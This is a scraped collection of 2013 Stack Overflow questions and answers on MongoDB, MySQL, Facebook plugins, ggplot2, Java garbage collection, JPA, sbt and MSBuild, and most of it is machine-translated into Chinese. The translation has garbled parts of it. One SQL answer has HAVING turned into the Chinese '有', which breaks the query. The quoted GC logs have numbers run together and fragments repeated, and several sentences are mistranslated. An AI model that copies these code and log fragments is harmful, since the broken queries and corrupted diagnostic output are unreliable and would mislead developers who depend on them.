Mon Oct 31 18:40:34 [initandlisten] fd limit hard:1024 soft:1024 max conn: 819
Mon Oct 31 18:40:34 [initandlisten] waiting for connections on port 27017
Mon Oct 31 18:40:34 BackgroundJob starting: snapshot
Mon Oct 31 18:40:34 BackgroundJob starting: ClientCursorMonitor
Mon Oct 31 18:40:34 BackgroundJob starting: PeriodicTask::Runner
Mon Oct 31 18:40:34 [websvr] fd limit hard:1024 soft:1024 max conn: 819
Mon Oct 31 18:40:34 [websvr] admin web console waiting for connections on port 28017 
```

the command prompt gets hung up for so much time as i start mongod.exe i have made the directory data\db as well [http://docs.mongodb.org/manual/tutorial/install-mongodb-on-windows/#mongodb-as-a-windows-service](http://docs.mongodb.org/manual/tutorial/install-mongodb-on-windows/#mongodb-as-a-windows-service)

# mysql - MySQL: Select Order Only if all its Items are ready status

> ID：15562285
> 
> 赞同：0
> 
> 时间：2013-03-22T03:35:36.740
> 
> 标签：mysql, select, subquery

I will simplify the table like this:

```
table order:
order_id | name
1          a
2          b
3          c

Table order_item:
item_id | fk_order_id | status
1         1             0
2         1             1
3         2             1
4         2             1
5         3             0 
```

Ready status let say is 1, so only order_id=2 has all its items are on ready status.

How can I query select it?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T04:13:26.850

有几种方法可以做到这一点——这里是一种使用`COUNT`——gets `COUNT`of all并与`COUNT`Status = 1进行比较：

```
SELECT fk_order_id
FROM (
  SELECT fk_order_id, 
     COUNT(1) totCount, 
     COUNT(CASE WHEN Status = 1 THEN 1 END) statusCount
  FROM Order_Item
  GROUP BY fk_order_id
) t
WHERE totCount = statusCount 
```

[SQL 小提琴演示](http://sqlfiddle.com/#!2/81d1a/2)

这可以合并到一个查询中，但我认为使用子查询读起来更好。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T04:06:19.250

试试这个： SELECT order_id ,name FROM order,order_item WHERE order.order_id =order_item.fk_order_id group by order_id ,name 有 min(status)=1

# ajax - How to render facebook comment plugin after ajax?

> ID：15562286
> 
> 赞同：3
> 
> 时间：2013-03-22T03:35:37.040
> 
> 标签：ajax, facebook, plugins, social

in header

```
<meta property="fb:admins" content="my id"/> 
<meta property="fb:app_id" content="my api"/> 
```

And in body

```
 <div id="fb-root"></div>
        <script>(function(d, s, id) {
            var js, fjs = d.getElementsByTagName(s)[0];
            if (d.getElementById(id)) return;
            js = d.createElement(s); js.id = id;
            js.src = "//connect.facebook.net/ru_RU/all.js#xfbml=1&appId=my api";
            fjs.parentNode.insertBefore(js, fjs);
        }(document, 'script', 'facebook-jssdk'));</script> 
```

In html

```
<div id="facebook">
<div class="fb-comments" data-href="<?= $this->productLink ?>" data-width="470" data-num-posts="10"></div>
    </div> 
```

I find problem-i load my web page with ajax and that facebook code don't work with ajax. How render my facebook comments after ajax? Execute that function?

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2013-03-22T04:03:41.390

在 ajax 下方添加以下 javascript 代码以显示 facebook 评论插件。

```
FB.XFBML.parse(); 
```

参考：http: [//developers.facebook.com/docs/reference/javascript/FB.XFBML.parse/](http://developers.facebook.com/docs/reference/javascript/FB.XFBML.parse/)

# r - plotting 2 datasets with unequal lengths using ggplot2

> ID：15562289
> 
> 赞同：4
> 
> 时间：2013-03-22T03:35:56.620
> 
> 标签：r, ggplot2

I have 2 datasets with unequal lengths for plotting using ggplots2:

```
Data A;

column x column y
0.23     1.54    
0.44     1.46
0.69     1.37
0.70     1.21
0.75     1.01
0.88     0.91 

Data B:

column x column y
0.13     1.24    
0.34     1.16
0.49     1.07
0.54     0.99
0.69     1.01 
```

I'm sure of how to write a code in ggplot2 for plotting these two data sets together. In both cases, plots shown as x axis = column x and y axis= column y. Can someone help me please?

James

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-22T08:49:23.213

假设您有数据集 A 和 B 作为 data.frame：

```
A <- data.frame(x=1:5, y=11:15)
B <- data.frame(x=1:10, y=20:11) 
```

您必须将它们连接在一起：

```
df <- rbind(A, B) # Join A and B together.
df
    x  y
1   1 11
2   2 12
3   3 13
4   4 14
5   5 15
6   1 20
7   2 19
8   3 18
9   4 17
10  5 16
11  6 15
12  7 14
13  8 13
14  9 12
15 10 11 
```

然后你可以绘制它：

```
ggplot(data=df, aes(x=x, y=y)) + geom_point() 
```

如果要通过颜色区分数据集 A 和 B 中的点：

```
df$dataset <- c(rep("A", nrow(A)), rep("B", nrow(B)))
df
    x  y dataset
1   1 11       A
2   2 12       A
3   3 13       A
4   4 14       A
5   5 15       A
6   1 20       B
7   2 19       B
8   3 18       B
9   4 17       B
10  5 16       B
11  6 15       B
12  7 14       B
13  8 13       B
14  9 12       B
15 10 11       B

ggplot(data=df, aes(x=x, y=y, col=dataset)) + geom_point() 
```

如果要通过颜色和大小区分数据集 A 和 B 中的点并更改轴标签：

```
ggplot(data=df, aes(x=x, y=y, col=dataset, size=dataset)) + geom_point() +
scale_color_manual(name="Dataset", labels = c("Data A","Data B"), values=c("red", "blue")) + 
scale_size_manual(name="Dataset", labels = c("Data A","Data B"), values=c(10, 5)) + 
xlab("xxxx") + ylab("yyyy") 
```

请参阅[教程](https://github.com/echen/ggplot2-tutorial)或使用 google :)。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2020-06-18T17:49:15.000

我知道在绘制数据点（稀疏的）和理论曲线中的一条线（有很多数据点）时，总是会出现这种情况

在这种情况下，您可以分别为每个 ggplot 几何图形提供不同的美学映射。

例如[在此编辑以使最好的例子成为第一个]

```
ggplot() +
  geom_point(data = df_A, aes(x, y)) + 
  geom_line(data = df_B, aes(x, y), color = "red") +
  theme_minimal() 
```

或者

```
ggplot() +
  with(df_A, geom_point(aes(x, y))) + 
  with(df_B, geom_line(aes(x, y)), color = "red") +
  theme_minimal() 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-03-22T03:44:32.560

一种选择是将数据放入一个 data.frame 中。这是一个使用`ldply()`from的示例`plyr()`，假设您的 data.frames 被命名为`d1`and `d2`：

```
library(plyr)
> d3 <- ldply(list(d1 = d2, d2 = d2))
> rbind(head(d3,2), tail(d3,2))
   .id column.x column.y
1   d1     0.13     1.24
2   d1     0.34     1.16
9   d2     0.54     0.99
10  d2     0.69     1.01 
```

或者在绘图时简单地将不同的数据集传递给不同的几何图形。像这样的东西：

```
ggplot() +
  geom_point(data = d1, aes(column.x, column.y)) +
  geom_point(data = d2, aes(column.x, column.y), colour = "red") 
```

# node.js - Backbone.js：管理界面

> ID：15562291
> 
> 赞同：1
> 
> 时间：2013-03-22T03:36:03.433
> 
> 标签：node.js, backbone.js, admin, crud

我正在开发一个基于 CRUD 的数据库，它需要有一些基于用户的 ACL（访问控制列表）。我们想让它也有一个管理员访问面板，以便我们可以在需要时快速删除内容或以其他方式对其进行审核。我试图保持它的灵活性，以便为了方便起见它可以是一个单独的界面，但也不会偏离一般用户界面，否则它会更难维护。

假设后端将处理 ACL，那么在前端处理创建用户界面的好方法是什么？是否有必要创建一个单独的 BB.js 接口来提供服务，或者向所有将被忽略的用户传递一些额外的代码是否可以？

建议或警告也将不胜感激！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T07:42:01.060

我将您的问题解释为您想为不同访问级别的用户提供不同的界面。因此我会：

1.  在用户访问每条路线之前检查他们的访问权限，以确保他们没有访问他们不应该看到的页面

2.  他们仍然可以尝试规避这一点（因为他们可以更改他们的用户模型），您的后端仍然会捕获任何未经授权的请求。

3.  您还可以根据用户访问级别有条件地显示和隐藏页面元素。

这是我的 ACL.coffee 的示例代码

```
acl = {}

acl['admin'] = [
    'page1',
    'page2',
    'page3',
    'page4',
    'page5'
]

acl['user'] = [
    'page1',
    'page2',
    'page3'
]

hasAccess = (route) ->
    # Get User Model
    user = window.App.user
    # Get Associated ACL
    permissions = acl[user.get('role')]
    # Check each URL for Access Privileges
    # Returns false if route not in array
    permissions.some (r) -> ~route.indexOf r

{hasAccess} 
```

# java - Java - GC 正在运行但没有回收任何东西

> ID：15562299
> 
> 赞同：13
> 
> 时间：2013-03-22T03:36:46.510
> 
> 标签：java, coldfusion, coldfusion-9, heap-memory, heap-dump

在过去的几天里，我们看到我们服务器上的 JVM 进入了一种状态，即它们在 OldGen 的 GC 中花费了 100% 的 CPU 时间，此时：

A. 他们不需要，因为堆上有足够的空间，并且

B. 他们没有回收任何东西。

通过查看堆栈跟踪并将 ProcessExplorer 中的 ThreadID 与堆栈转储中的相关联，我知道它们在 GC 中。每个 GC 线程占用大约 4% 的 CPU。

服务器运行 16 gig 堆（32gig 物理 RAM）并有 8 个内核。正常运行时间通常约为 30 天，仅由于 MS 补丁要求而需要重新启动，但目前它们在 20 天时崩溃。

这是持续时间的图表，时间尺度 = 19 天。 [http://i45.tinypic.com/257qalu.png](http://i45.tinypic.com/257qalu.png)

这是该图尾部的放大图 [http://i48.tinypic.com/2duiccw.png](http://i48.tinypic.com/2duiccw.png)

如您所见，持续时间急剧增加。

这是 GC 后堆使用情况的图表。 [http://i48.tinypic.com/znna4h.png](http://i48.tinypic.com/znna4h.png)

如果这是一个典型的内存泄漏，我希望看到橙色的峰值越来越高，直到它们不再达到峰值，但正如这张图所示，还有大量的堆空间。

我为每台服务器都有堆转储，没有什么特别突出的问题。有几个ehCache存储，我可以看到我们的应用程序代码，即，只是“普通的东西”

我们大约 20 天前所做的最大改变是实现了一个供应商补丁，该补丁将内部缓存从使用硬引用（以及明显的内存泄漏）的无界哈希映射更改为由软引用组成的缓存，我想知道这是否是原因，即，在某个点之后管理这些软引用会产生巨大的开销？

有没有人对下一步看哪里有任何想法，或者有人可以证实我的软参考理论吗？

这是我的 jvm.args：

> java.args=-server -Xms16000m -Xmx16000m -Dsun.io.useCanonCaches=false -XX:MaxPermSize=350m -Xloggc:e:/gcLogs/eRGCLogs.txt -verbose:gc -XX:+PrintGCDetails -XX:+PrintGCTimeStamps - XX:+PrintGCDateStamps -XX:+UseParallelGC -XX:+UseParallelOldGC -Dnet.sf.ehcache.sizeof.filter=D:/jo3/java_ehCacheOpenSource/sizeOfExclusions.config -Xbatch -Dcoldfusion.rootDir={application.home}/.. / -Dcoldfusion.libPath={application.home}/../lib -Dcoldfusion.classPath={application.home}/../lib/updates,{application.home}/../lib,{application.home} /../gateway/lib/,{application.home}/../wwwroot/WEB-INF/flex/jars,{application.home}/../wwwroot/WEB-INF/cfform/jars,d:/ jo3/java,d:/JO3/java_ehCacheOpenSource/,D:/jo3/java_ehCacheMonitorProbe

我们在 Coldfusion 上，它有点像一个位于 java 之上的大型框架。

JVM版本：1.6.0_29

根据要求，“正常”GC 日志如下所示：

> 2013-03-19T22:11:36.670+1100: 1288665.702: [GC [PSYoungGen: 4695800K->471119K(4722112K)] 9301727K->5077046K(15644800K), 0.3584434 秒=0.3584434 秒=0 时间。 0.36秒] 2013-03-19T22：14：55.078 + 1100：128864.099：[GC [PSYOUNGGEN：4722063K-> 498009K（4783104K）9327990K-> 5103936K（15705792K），0.3766889秒，0.3766889秒] [次数：user = 5.37 sys = 0.00 , real=0.38 秒] 2013-03-19T22:17:46.749+1100: 1289035.760: [GC [PSYoungGen: 4654489K->517299K(4673792K)] 9260416K->5123227K(155930580K), 0.s [时间 1:40580K), 0\. sys=0.00, real=0.41 secs] 2013-03-19T22:21:08.762+1100: 1289237.763: [GC [PSYoungGen: 4673779K->522660K(4738880K)] 9279707K->5143831K(156605516K s) [043831K->5143831K(156605516K s) 0.Time用户=5.97 系统=0.00，实际=0.40 秒] 2013-03-19T22:23:42.683+1100:1289391.675:[GC [PSYoungGen:4582628K->530998K(4590976K)] 9203799K->5186242K(15513664K), 0.4317352 秒] [时间: 用户=6.24 系统=0.00, 实际=0.43 秒] 2013-03-19T22:26:11.096+1100: [GCPSYoungGen5.90: 128 4590966K->518331K(4724096K)] 9246210K->5206959K(15646784K)，0.3914401 秒] [时间：用户=5.99 系统=0.00，实际=0.39 秒] 2013-03-19T22:257:44.0763:3\. [GC] [PSYOUNGGEN：2602730K-> 447527K（4732864K）] 7291358K-> 5208743K（15655552K），0.3725317秒，0.3725317秒] [次数：User = 5.80 Sys = 0.00，Real = 0.37秒] 2013-03-19T22：27：4448 + 1100：1289633.428 ：[全GC（系统）[PSYOUNGGEN：447527K-> 0K（4732864K）] [PARORDGEN：4761215K-> 4628296K - > 4628296K（15655552K）[PSPermgen：352378K-> 352287K（352832K），4.2955639秒] [时间：用户 = 57.70 系统 = 0.06，实际 = 4.30 秒] 2013-03-19T22：30：37.950+1100：1289806.920：[GC [PSYoungGen：4004416K->70948K(4690432K)] 8632712K->4699245K(15613120K), 0.1062227 secs] [Times: user=0.76 sys=0.00, real=0.11 secs] 2013-03-19T22:33:27.154+1100: [12GC861599] 4054116K->109175K(4092352K)] 8682413K->4737472K(15015040K), 0.1347919 秒] [时间: 用户=1.03 系统=0.00, 实际=0.13 秒] 2013-03-19T22:306: [32.9016+] [PSYoungGen: 4092343K->147318K(4712320K)] 8720640K->4775615K(15635008K), 0.1593523 secs] [Times: user=1.58 sys=0.00, real=0.16 secs] 24092343K->147318K(4712320K)] 8720640K->4775615K(15635008K)，0.1593523 秒] [时间：用户=1.58 系统=0.00，实际=0.16 秒] 24092343K->147318K(4712320K)] 8720640K->4775615K(15635008K)，0.1593523 秒] [时间：用户=1.58 系统=0.00，实际=0.16 秒] 2

当我们处于故障模式时，GC 日志如下所示：

> 2013-03-22T10:03:47.619+1100: 1504185.901: [GC [PSYoungGen: 0K->0K(5452736K)] 4413907K->4413907K(16375424K), 0.0114248 秒] [时间: 用户=0.16 系统= 0.01 秒] 2013-03-22T10:03:47.631+1100: 1504185.912: [完整 GC [PSYoungGen: 0K->0K(5452736K)] [ParOldGen: 4413907K->4412613K(10922688K)] 44133901->44133K017664426 PSPermGen: 358399K->358278K(358400K)], 5.4435442 秒] [时间: 用户=73.74 系统=0.14, 真实=5.44 秒] 2013-03-22T10:03:53.145+1100: 1504191.26926: [GCK-PSYoungGen: >7734K(5449088K)] 4681833K->4422114K(16371776K), 0.0298728 secs] [Times: user=0.34 sys=0.00, real=0.03 secs] 2013-03-22T10:03:53.175+1100: [Full 1.456: 15041: PSYoungGen: 7734K->0K(5449088K)] [ParOldGen: 4414379K->4415189K(10922688K)] 4422114K->4415189K(16371776K) [PSPermGen: 358399K->358371K(358400K).,6033684 秒] [时间：用户=36.33 系统=0.00，实际=2.60 秒] 2013-03-22T10:03:55.788+1100: 1504194.069: [GC [PSYoungGen: 94969K->826K(5451328K)] 4410101K58K->446101K58K->4 16374016K），0.0133588 秒] [时间：用户 = 0.16 系统 = 0.00，实际 = 0.01 秒] 2013-03-22T10：03：55.802+1100：1504194.082：[完整 GC [PSYoungGen：826K->0K（5451328K）] ParOldGen: 4415189K->4415348K(10922688K)] 4416015K->4415348K(16374016K) [PSPermGen: 358399K->358389K(358400K)], 2.7156884 secs] [Times: user=38.171 sys=0002,=2.71 系统4415189K->4415348K(10922688K)] 4416015K->4415348K(16374016K) [PSPermGen: 358399K->358389K(358400K)], 2.7156884 secs] [Times: user=38.11 sys=0.0.0.04415189K->4415348K(10922688K)] 4416015K->4415348K(16374016K) [PSPermGen: 358399K->358389K(358400K)], 2.7156884 secs] [Times: user=38.11 sys=0.0.0.0

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-22T19:27:49.063

正如许多人在评论中提到的那样，PermGen 中的空间不足很可能是您的原因。这可能是由于在整个代码中过度插入字符串造成的，这可能导致 PermGen“爆炸”——同时加载大量类（通常通过在后台为您执行此操作的框架）也可能导致这种情况。

此外，正如提到的评论之一 -假设问题出在老年代的容量上，使用 CMS 集合（并发标记和扫描）可以减少您的**Stop the World GC。**它还可以通过减少延迟来提高您的性能，无论当前问题如何，这都是好的。

此外，如果您发布 GC 日志的片段，这可能有助于为您指明正确的方向。

关于**jstat**工具，您可以通过以下方式使用它来获取有用的信息：

```
jstat -gcutil <pid> <interval> 
```

我通常使用 1000 毫秒的间隔。`-gcutil`为您提供 GC 利用率（以 % 为单位） - 因此您可以查看是否有任何一代接近 100%。

您还可以使用`jstat -gc <pid> ...`并获取老年代的确切容量。

* * *

**编辑**：查看 GC 日志后

根据您的 GC 日志，它确认了您的 PermGen 正在填满的原始前提。在**10:03:47**到**10:03:55**之间的时间范围内，我可以看到 PermGen 不断达到最大值，而 GC 以某种方式删除了大约 10-100 KB 的数据：

见下文：

```
2013-03-22T10:03:47.631+1100: 1504185.912: [Full GC [... [PSPermGen: 358399K->358278K(358400K)]...
2013-03-22T10:03:53.175+1100: 1504191.456: [Full GC [... [PSPermGen: 358399K->358371K(358400K)]...
2013-03-22T10:03:55.802+1100: 1504194.082: [Full GC [... [PSPermGen: 358399K->358389K(358400K)]... 
```

如果您查看 OldGen 和 Young 代，您会发现它们都没有达到最大值，OldGen 正在消耗 10GB 中的 4GB - 所以这不是原因。

根据您收集的数据，我无法判断 PermGen 填充的速度是否与流程的正常运行时间一致 - 这意味着 PermGen 看起来应该在一天内填充，而不是 20 天。所以很难说什么是明确的解决方案，但这里有一些建议：

1.  检查您的代码以确保您没有滥用`String`'s`intern()`方法 - 如果您无缘无故地在代码中使用它过于广泛，这可能是您的根本原因。
2.  检查您正在使用的框架是否动态生成类 - 这也会消耗 PermGen 空间，但在一定程度上。
3.  如果可以，请每周重新启动您的流程以防止这种停机时间
4.  考虑增加永久代空间，但要监控它，因为增加它可能只会延长你的 20 天期限，但不能解决问题。在该过程已经存在足够长的时间之后，PermGen 应该保持相当静态。
5.  **使用字符串Coldfusion PermGen**在 Google 上运行搜索会产生许多报告问题的结果 - 尝试关注这些结果以专注于您的调查。

# mysql - 使用 BLOB 数据类型在数据库中插入图像

> ID：15562301
> 
> 赞同：1
> 
> 时间：2013-03-22T03:37:04.237
> 
> 标签：mysql, jpa, jpa-2.0

实体：

```
@Lob
@Column(name = "logo")
private byte[] logo; 
```

形式：

```
<h:form enctype="multipart/form-data">  
    <p:messages showDetail="true"/>  

    <p:fileUpload value="#{testController.file}" 
                  update="messages"  
                  mode="simple"
                  sizeLimit="1048576"   
                  allowTypes="/(\.|\/)(gif|jpe?g|png)$/"/>  

    <p:growl id="messages" showDetail="true"/>  

    <p:commandButton value="Submit" ajax="false"  
                     actionListener="#{testController.upload}"/>  
</h:form> 
```

豆：

```
private testEntity current;
private UploadedFile file;

public UploadedFile getFile() {
    return file;
}

public void upload() {
    if (file != null) {
        try {
            byte[] data = file.getContents();
            current.setLogo(data);

            getFacade().edit(current);
            JsfUtil.addSuccessMessage("Successful! " + file.getFileName() + " is uploaded.");
        } catch (Exception e) {
        }
    }
} 
```

当我尝试上传像 80kb 图片这样的文件时，它会给我这个异常

```
Exception [EclipseLink-4002] (Eclipse Persistence Services - 2.3.2.v20111125-r10461): org.eclipse.persistence.exceptions.DatabaseException
Internal Exception: com.mysql.jdbc.MysqlDataTruncation: Data truncation: Data too long for column 'logo' at row 1 
```

但如果我只上传 < 10kb 的图片，代码就可以工作。

使用 JSF 2.0、Primefaces 3.5，大多数代码都是使用 CRUD 自动生成的。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T06:20:50.883

问题是您的数据库列设置为存储的内容少于您尝试存储的内容。这就是截断的意思。

您需要将数据库列定义更改为 LONGBLOB。

# python - 拉盘的概率（python）

> ID：15562303
> 
> 赞同：0
> 
> 时间：2013-03-22T03:37:25.120
> 
> 标签：python, geometry, probability

使用 python 3.3 ，我应该回答以下问题：

从一个装满棋子的盒子中，我们想知道当盒子里的所有棋子都是红色或蓝色时，连续拉出两个蓝色棋子的概率。编写一个函数，计算一个装满了任意数量的红色圆盘和任意数量的蓝色圆盘的盒子的概率。一个你可能想要使用的测试用例：如果盒子里有 15 个蓝色圆盘和 6 个红色圆盘，你有 50% 的机会连续抽出两个蓝色圆盘。

现在编写一个函数，计算在 0 和盒子中的圆盘数量之间的某个 n 连续绘制 n 个蓝色圆盘的概率。

我试过用这个模型

```
import random
def random_pick(some_list, probabilities):
    x = random.uniform(0, 1)
    cumulative_probability = 50.0
    for item, item_probability in zip(some_list, probabilities):
        cumulative_probability += item_probability
        if x < cumulative_probability: break
    return item 
```

我几乎完全迷失了。请帮忙。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T03:47:10.147

抽到一个蓝色圆盘的概率等于蓝色圆盘与总圆盘的比率，例如，如果你有 2 个蓝色圆盘和 2 个红色圆盘，你抽到一个蓝色圆盘有 0.5 的变化。

如果要绘制第二个圆盘，由于您已经移除了一个蓝色圆盘，您需要计算少一个（蓝色）圆盘的概率。所以你现在有 1 个蓝色 2 个红色的圆盘，因此有 1/3 的概率。由于此概率取决于第一个条件，因此您需要将两个概率相乘，即 1/2 * 1/3。

一般来说：

```
def prob_blue_inrow(numb, numr, n): 
  p = numb / (numr + numb * 1.0)
  if (n == 1): 
    return p
  else:
    return p *  prob_blue_inrow(numb - 1, numr, n - 1)

print(prob_blue_inrow(15, 6, 2)) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-22T04:17:42.833

对于这种情况，枚举所有情况并不太占用 CPU

```
>>> from itertools import combinations
>>> sum('r' not in x for x in combinations('b' * 15 + 'r' * 6, 2))
105
>>> sum(1 for x in combinations('b'*15+'r'*6, 2))
210
>>> 105/210.0
0.5 
```

即使是 1000 个蓝色和 1000 个红色也可以在不到一秒的时间内枚举出来。如果您将样本数量增加到 3，它的表现会非常糟糕:)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-22T03:41:55.340

`P(blue) = P(blue 1) * P(blue 2) * ... * P(blue n)` 如果有 15 个蓝色圆盘和 6 个红色圆盘，则总共有 21 个。是`P(blue 1)`15/21 = .7143。现在还剩下 20 个圆盘，其中 14 个是蓝色的。因此，`P(blue 2)`是 14/20 = 0.7。`0.7143 * 0.7 = 0.5`

无论您需要拉多少，您都可以重复此操作。

在伪代码中：

```
probabilityOfBlue (numBlueInDeck, numRedInDeck, numBlueToPull)
  if (numBlueToPull > numBlueInDeck or numBlueToPull < 0 or (numBlueInDeck + numRedInDeck) == 0)
    return 0

  probability = 1.0
  i = 0
  while i < numBlueToPull
    probability = probability * (numBlueInDeck/(numBlueInDeck + numRedInDeck))
    numBlueInDeck = numBlueInDeck - 1
    i = i + 1

  return probability 
```

# r - 使用 r 中的自定义颜色按因子着色图

> ID：15562308
> 
> 赞同：3
> 
> 时间：2013-03-22T03:37:42.267
> 
> 标签：r, colors, plot

我正在尝试制作一个按因子着色的散点图。我正在使用以下代码：

```
data<-iris
plot(data$Sepal.Length, data$Sepal.Width, col=data$Species) 
```

无论如何我可以按物种因素着色但指定我自己的自定义颜色吗？在谷歌上环顾四周，似乎可以使用 ggplot2 但我从未使用过它，并希望我可以使用基本的 R 函数来做到这一点。

任何帮助将不胜感激！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-03-22T03:45:53.953

您可以手动设置`plot`调用使用的 R 调色板，如下所示：

```
palette(c("blue","pink","green")) 
```

您可以像这样重置：

```
palette("default") 
```

试一试，创建两个图，一个使用默认颜色，一个使用指定的新颜色：

```
# default plotting
palette("default")
plot(iris$Sepal.Length, iris$Sepal.Width, col=iris$Species, pch=19)

# after specifying custom palette
palette(c("blue","pink","green"))
plot(iris$Sepal.Length, iris$Sepal.Width, col=iris$Species, pch=19) 
```

# scala - Scala SBT：当本地依赖发生变化时触发动作

> ID：15562310
> 
> 赞同：5
> 
> 时间：2013-03-22T03:37:44.677
> 
> 标签：scala, sbt

在 SBT 中，您可以使用“~”标记在源文件更改时触发操作。例如，

```
sbt> ~test 
```

将在源更改时运行单元测试。

*每当源更改或*本地依赖项更改时，是否有任何*好的*方法来触发操作？这在同时开发两个项目时很有用，其中一个项目依赖于另一个项目。

 *[我知道您可以通过手动指定文件](https://stackoverflow.com/questions/12764795/sbt-dependency-on-other-sbt-project-without-publishing)或[基础项目](https://stackoverflow.com/questions/14351940/setting-up-sbt-environment-to-hack-on-multiple-libraries-at-once)的路径来获得这种行为，但这很脆弱，而且 SBT 已经知道它从哪里获取本地工件，所以我想避免这种情况。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-22T19:17:37.713

从[Triggered Execution](http://www.scala-sbt.org/release/docs/Detailed-Topics/Triggered-Execution)的文档中，您可以在该`watchSources`任务中添加要监视的其他文件。

从[另一个问题](https://stackoverflow.com/a/7862872/850196)来看，该`managedClasspath`任务提供了来自托管依赖项的类路径部分。

然后，以下定义将托管测试类路径添加到文件以监视触发执行：

```
watchSources <++=
  (managedClasspath in Test) map { cp => cp.files } 
```

在您要触发的每个项目中定义它。*

# msbuild - MsBuild 没有在发布配置中生成 PDB 文件

> ID：15562311
> 
> 赞同：11
> 
> 时间：2013-03-22T03:37:46.610
> 
> 标签：msbuild

```
<MSBuild Projects="$(ProjectFile)"  Targets="_WPPCopyWebApplication;"
Properties="OutDir=..\publish;Configuration=Release;Platform=AnyCPU" /> 
```

我正在使用上面的脚本来发布 Asp.Net 项目。在项目设置中，我绝对确保在发布模式下生成调试符号。MsBuild 仍然没有在输出中生成 pdb 文件。

```
 <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
    <DebugType>Full</DebugType>
    <DefineDebug>false</DefineDebug>
    <DefineTrace>true</DefineTrace>
    <Optimize>true</Optimize>
    <OutputPath>bin\</OutputPath>
    <DocumentationFile>WebProject.xml</DocumentationFile>
    <DebugSymbols>true</DebugSymbols>
  </PropertyGroup> 
```

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2013-03-22T17:59:23.970

查看 Microsoft.Web.Publishing.targets 源代码后，我发现一个变量 (ExcludeGeneratedDebugSymbol) 在发布模式下设置为 True。从评论来看，他们似乎想从 WebSite 项目中排除符号，但没有为 WebApplication 项目正确设置条件。

所以，我决定从调用者参数中覆盖我的构建脚本，它就像一个魅力。我还没有确定它可能导致的任何副作用，或者为了未来的稳定性而使用未记录的财产，但它现在有效。

**来自 Microsoft.Web.Publishing.target 文件**

```
<!--For website we will always exclude debug symbols from publishing unless it is set explicitly by user in website publish profile-->
    <ExcludeGeneratedDebugSymbol Condition="'$(ExcludeGeneratedDebugSymbol)'=='' And '$(_WebProjectType)' == 'WebSite'">True</ExcludeGeneratedDebugSymbol>

    <ExcludeGeneratedDebugSymbol Condition="'$(ExcludeGeneratedDebugSymbol)'=='' And '$(Configuration)' == 'Release'">True</ExcludeGeneratedDebugSymbol>
    <ExcludeGeneratedDebugSymbol Condition="'$(ExcludeGeneratedDebugSymbol)'==''">False</ExcludeGeneratedDebugSymbol> 
```

**我已按如下方式更新了我的脚本。**

```
<MSBuild Projects="$(ProjectFile)"  Targets="_WPPCopyWebApplication;"
Properties="OutDir=..\publish;Configuration=Release;Platform=AnyCPU"; ExcludeGeneratedDebugSymbol=false /> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2015-07-20T13:07:02.823

您还可以更新您的发布配置文件 (.pubxml) 文件以包含该属性值。我今天必须使用 TFS Build 2015 中的新构建位来执行此操作，以使 Web 发布包含 .pdb 文件。请参阅将属性添加到底部的文件示例内容。

```
<?xml version="1.0" encoding="utf-8"?>
<!--
This file is used by the publish/package process of your Web project. You can customize the behavior of this process
by editing this MSBuild file. In order to learn more about this please visit http://go.microsoft.com/fwlink/?LinkID=208121\. 
-->
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup>
    <WebPublishMethod>FileSystem</WebPublishMethod>
    <SiteUrlToLaunchAfterPublish />
    <publishUrl>C:\Publish</publishUrl>
    <DeleteExistingFiles>True</DeleteExistingFiles>
    <LastUsedBuildConfiguration>Release</LastUsedBuildConfiguration>
    <LastUsedPlatform>Any CPU</LastUsedPlatform>
    <ExcludeApp_Data>False</ExcludeApp_Data>
    <LaunchSiteAfterPublish>False</LaunchSiteAfterPublish>
    <ExcludeGeneratedDebugSymbol>false</ExcludeGeneratedDebugSymbol>
  </PropertyGroup>
</Project> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2018-03-27T16:56:40.493

您可以将其直接放在`*.csproj`文件中，作为最后一个属性组部分（就在`Import`元素之前）：

```
<PropertyGroup>
  <ExcludeGeneratedDebugSymbol Condition="$(DebugSymbols) == true">false</ExcludeGeneratedDebugSymbol>
</PropertyGroup> 
```

# matlab - 我正在尝试在“imagesc”上绘制“scatter”，这不起作用。

> ID：15562312
> 
> 赞同：1
> 
> 时间：2013-03-22T03:37:50.043
> 
> 标签：matlab

我正在尝试在“imagesc”上绘制“scatter”，这不起作用。但是，我可以单独绘制“散点图”。我什至尝试过“坚持”而不是“坚持”。有人可以帮我吗？谢谢你。

```
figure(2)
imagesc(lat1,height,scatter0')
hold on;
scatter(lat1,top2,'k')
title('2012_12_4')
colormap(colors)
axis xy 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T03:58:00.503

可能是 xy 限制不匹配，或者 z 值未正确标准化以并排绘制。标准化很重要，因为`imagesc`并且`scatter`将共享相同的颜色图。除此之外，您的代码对我来说效果很好。例如，我在 [0,1] 范围内对两个图的“z”值进行归一化：

```
load seamount
m=peaks(200);
m=(m-min(m(:)))./(max(m(:))-min(m(:)));
imagesc([0.996 1.0005],[1,1.012],m); 
hold on ; 

z=(z-min(z(:)))./(max(z(:))-min(z(:)));
scatter(x./max(x(:)),y./max(y(:)),5,z); 
```

![在此处输入图像描述](../Images/51c7b64b28714a87d1a13c478855d0dd.png)

# salesforce - 在销售人员上创建的自定义对象未显示在潜在客户下

> ID：15562322
> 
> 赞同：0
> 
> 时间：2013-03-22T03:39:09.630
> 
> 标签：salesforce, apex-code

